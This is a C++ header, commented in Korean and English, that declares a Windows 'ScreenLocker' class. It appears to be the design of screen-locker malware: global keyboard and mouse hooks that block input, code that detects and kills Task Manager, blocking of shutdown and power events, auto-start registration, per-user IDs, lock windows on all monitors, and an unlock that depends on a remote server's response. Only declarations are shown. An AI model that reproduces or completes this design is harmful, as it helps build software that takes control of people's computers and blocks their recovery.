#pragma once

#include <windows.h>
#include <string>
#include <winhttp.h>
#include <vector>
#include <tlhelp32.h>
#include "utils.h"

class ScreenLocker {
private:
    // Basic member variables
    HINSTANCE hInstance;
    HWND hWnd;
    std::string userID;

    // ↓↓↓ Error handling variables ↓↓↓
    int networkRetryCount;                 // 네트워크 재시도 횟수
    DWORD lastNetworkError;               // 마지막 네트워크 오류 코드
    bool networkConnectivityLost;         // 네트워크 연결 상실 상태
    std::string lastFailedOperation;      // 마지막 실패한 작업
    
    // Browser control related variables
    bool browserRunning;           // Prevents duplicate browser execution
    HWND browserHwnd;             // Browser window handle for priority control

    // ↓↓↓ Thread safety variables ↓↓↓
    std::unique_ptr<std::thread> unlockThread;     // Managed unlock thread
    std::atomic<bool> shouldStopUnlock{false};     // Thread termination flag
    std::mutex unlockMutex;                        // Thread safety mutex

    // Hook related variables
    static ScreenLocker* instance;     // 전역 Hook에서 접근하기 위한 static 인스턴스
    HHOOK keyboardHook;                // 키보드 Hook 핸들
    HHOOK mouseHook;                   // 마우스 Hook 핸들
    bool inputBlockingEnabled;         // 입력 차단 활성화 상태
    bool allowBrowserInput;            // 브라우저 입력 허용 상태
    bool performingSystemAction;       // 시스템 동작 수행 중 (Alt+A 등)

    // ↓↓↓ Hook failure recovery variables ↓↓↓
    bool hookInstallationFailed;       // Hook 설치 실패 플래그
    int hookRetryCount;                // Hook 재시도 횟수
    UINT_PTR hookRetryTimer;           // Hook 재시도 타이머
    bool usingAlternativeBlocking;     // 대체 차단 방법 사용 중

    // ↓↓↓ Advanced security features variables ↓↓↓
    bool advancedSecurityEnabled;      // Advanced security features enabled
    HWND taskManagerHwnd;              // Task manager window handle
    UINT_PTR securityCheckTimer;          // Security check timer ID

    // ↓↓↓ System shutdown prevention variables ↓↓↓
    bool shutdownPreventionEnabled;    // Shutdown prevention feature enabled
    HHOOK shellHook;                   // Shell hook for system events
    bool systemShutdownAttempted;      // Flag for shutdown attempt detection

    // ↓↓↓ Multi-monitor support variables ↓↓↓
    std::vector<HWND> monitorWindows;        // Window handles for each monitor
    std::vector<MONITORINFO> monitorInfos;   // Monitor information
    int primaryMonitorIndex;                 // Index of the primary monitor
    bool multiMonitorEnabled;                // Multi-monitor feature enabled
    
    // Internal utility functions (using Utils namespace)
    std::string GenerateRandomID();
    std::string GetOrCreateUserID();
    bool RegisterAutoStart();
    
    // ↓↓↓ Enhanced error handling functions ↓↓↓
    bool SendHttpRequestWithRetry(const std::wstring& path, const std::wstring& method, 
                                  const std::string& data = "", std::string* response = nullptr);
    bool HandleNetworkError(DWORD errorCode, int attemptNumber);
    int CalculateBackoffDelay(int attemptNumber);
    bool IsRetryableError(DWORD errorCode);
    bool CheckNetworkConnectivity();
    
    // File operation error handling
    bool SafeCreateDirectory(const std::string& path);
    bool SafeDeleteFile(const std::string& path, int maxRetries = 3);
    bool SafeWriteFile(const std::string& path, const std::string& content);
    bool HandleFileError(const std::string& operation, const std::string& path, DWORD errorCode);
    
    std::wstring StringToWString(const std::string& str);
    std::string WStringToString(const std::wstring& wstr);
    std::string UrlEncode(const std::string& str);
    
    // Resource extraction functions
    bool ExtractRemoverExecutable();
    std::string GetRemoverPath();

    // Browser interaction functions
    void HandleUnlockProcess();       // 새로운 잠금 해제 처리 함수
    bool ExecuteRemoverWithAdmin();   // 제거 프로그램 실행 함수
    bool TestServerConnection();      // 서버 연결 테스트 함수

    // ↓↓↓ Modularized unlock process functions ↓↓↓
    bool OpenUnlockInterface();       // 브라우저 인터페이스 열기
    bool WaitForUserSignal();         // 사용자 신호 대기
    bool ProcessServerResponse();     // 서버 응답 처리
    void ExecuteUnlockAction(const std::string& serverStatus);  // 잠금 해제 실행
    void HandleUnlockTimeout();       // 타임아웃 처리
    void HandleUnlockCancellation();  // 취소 처리
    void CleanupUnlockResources();    // 잠금 해제 리소스 정리
    
    // HTML content generation
    std::string GenerateHTMLContent();
    
    // Browser control
    void OpenControlledBrowser();
    
    // Window priority control functions
    void SetScreenLockerTopmost();
    void SetBrowserTopmost();
    void RestoreScreenLockerTopmost();
    
    // Browser window finding and control
    bool FindBrowserWindow();
    void ControlBrowserWindow();
    void ClickAllowButton();

    void ConfineCursorToBrowser();
    void ReleaseCursorConfinement();

    // Hook related functions
    bool InstallInputHooks();
    void RemoveInputHooks();

    // ↓↓↓ Hook failure recovery functions ↓↓↓
    bool InstallKeyboardHookSafely();
    bool InstallMouseHookSafely();
    bool InstallLowLevelKeyboardFilter();
    bool InstallMessageBasedBlocking();
    bool VerifyHookInstallation();
    void HandleHookFailure(const std::string& hookType, DWORD errorCode);

    // Hook related functions2
    void EnableInputBlocking();
    void DisableInputBlocking();
    void SetBrowserInputMode(bool allow);
    void SetSystemActionMode(bool performing);

    // Hook procedure (static)
    static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Hook handling helper functions
    bool ShouldBlockKeyboardInput(WPARAM wParam, LPARAM lParam);
    bool ShouldBlockMouseInput(WPARAM wParam, LPARAM lParam);
    bool IsAllowedSystemKey(DWORD vkCode);

    // Advanced security features
    void EnableAdvancedSecurity();
    void DisableAdvancedSecurity();
    bool DetectAndBlockTaskManager();
    bool DetectAndBlockSystemShutdown();
    void BlockCriticalSystemProcesses();
    static void CALLBACK SecurityCheckCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);

    // ↓↓↓ System shutdown prevention functions ↓↓↓
    void EnableShutdownPrevention();
    void DisableShutdownPrevention();
    bool BlockSystemShutdown();
    bool BlockPowerManagementEvents();
    static LRESULT CALLBACK ShellHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    void HandleShutdownAttempt(const std::string& shutdownType);

    // System process control
    bool IsTaskManagerRunning();
    bool TerminateTaskManager();
    bool BlockSystemKeys(DWORD vkCode, bool isSystemKey);

    // ↓↓↓ 다중 모니터 함수들 추가 ↓↓↓
    // 다중 모니터 지원
    void EnableMultiMonitorSupport();
    void DisableMultiMonitorSupport();
    bool DetectMonitors();
    bool CreateMonitorWindows();
    void DestroyMonitorWindows();
    static BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData);
    void UpdateMonitorConfiguration();
    HWND CreateSecondaryWindow(const MONITORINFO& monitorInfo, int monitorIndex);
    static LRESULT CALLBACK SecondaryWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    
    // Cleanup function
    void Cleanup();
    
    // Window message handling
    static LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

public:
    // Constructor and destructor
    ScreenLocker(HINSTANCE hInst);
    ~ScreenLocker();
    
    // Main public functions
    bool Initialize();
    bool CreateMainWindow();
    int Run();

    // ↓↓↓ Thread safety functions ↓↓↓
    void StartUnlockProcessSafely();
    void HandleUnlockProcessSafe();
    
    // ↓↓↓ Resource cleanup functions ↓↓↓
    void ForceCleanupAllResources();
    void CleanupCOMResources();
    void CleanupWinHTTPResources();
    void CleanupTimerResources();
    
    // Browser status check (for debugging)
    bool IsBrowserRunning() const { return browserRunning; }

    // Hook status check
    bool IsInputBlockingEnabled() const { return inputBlockingEnabled; }
    
    // Static instance getter (used by Hook)
    static ScreenLocker* GetInstance() { return instance; }
};